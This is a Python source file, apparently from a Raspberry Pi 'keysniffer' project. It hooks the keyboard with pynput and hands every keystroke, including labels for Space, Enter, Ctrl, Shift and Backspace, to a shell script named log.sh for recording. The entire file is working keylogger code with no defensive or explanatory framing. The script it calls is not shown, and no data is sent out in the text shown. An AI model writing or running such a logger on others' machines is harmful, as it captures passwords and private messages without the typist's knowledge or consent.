from re import sub
import subprocess
import pynput.keyboard as Keyboard

pathtologSH="/home/pi/rpi-keysniffer/log.sh"

def on_press(key):
    # Callback function whenever a key is pressed
    try:
        print(f'Key {key.char} pressed!')
        subprocess.run(["/bin/sh", pathtologSH, f"{key.char}"])
    except AttributeError:
        print(f'Special Key {key} pressed!')
        print(key)
        if key==Keyboard.Key.space:
            subprocess.run(["/bin/sh", pathtologSH, "SPACE"])
        elif key==Keyboard.Key.enter:
            subprocess.run(["/bin/sh", pathtologSH, "ENTER"])
        elif key==Keyboard.Key.ctrl:
            subprocess.run(["/bin/sh", pathtologSH, "CTRL"])
        elif key==Keyboard.Key.backspace:
            subprocess.run(["/bin/sh", pathtologSH, "BACKSPACE"])
        elif key==Keyboard.Key.alt:
            subprocess.run(["/bin/sh", pathtologSH, "ALT"])
        elif key==Keyboard.Key.shift_r:
            subprocess.run(["/bin/sh", pathtologSH, "SHIFT"])
        elif key==Keyboard.Key.shift:
            subprocess.run(["/bin/sh", pathtologSH, "SHIFT"])
        elif key==Keyboard.Key.delete:
            subprocess.run(["/bin/sh", pathtologSH, "DELETE"])
        elif key==Keyboard.Key.alt_gr:
            subprocess.run(["/bin/sh", pathtologSH, "ALTGR"])
        elif str(key)=="None":
            subprocess.run(["/bin/sh", pathtologSH, "ALTGR"])
        else:
            subprocess.run(["/bin/sh", pathtologSH, f"{key}"])
def on_release(key):
    print(f'Key {key} released')
    if key == Keyboard.Key.esc:
        # Stop the listener
        return False
    elif str(key) == "<65027>":
        subprocess.run(["/bin/sh", pathtologSH, "ALTGR"])

with Keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
